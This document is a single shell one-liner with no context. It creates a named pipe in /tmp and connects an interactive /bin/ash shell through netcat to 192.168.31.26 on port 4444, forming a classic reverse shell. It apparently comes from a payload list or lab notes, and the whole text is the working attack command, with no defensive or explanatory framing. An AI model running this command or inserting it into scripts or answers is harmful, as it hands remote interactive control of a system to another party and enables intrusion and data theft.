rm /tmp/f1 ; mkfifo /tmp/f1;cat /tmp/f1 | /bin/ash -i 2>&1 | nc 192.168.31.26 4444 > /tmp/f1
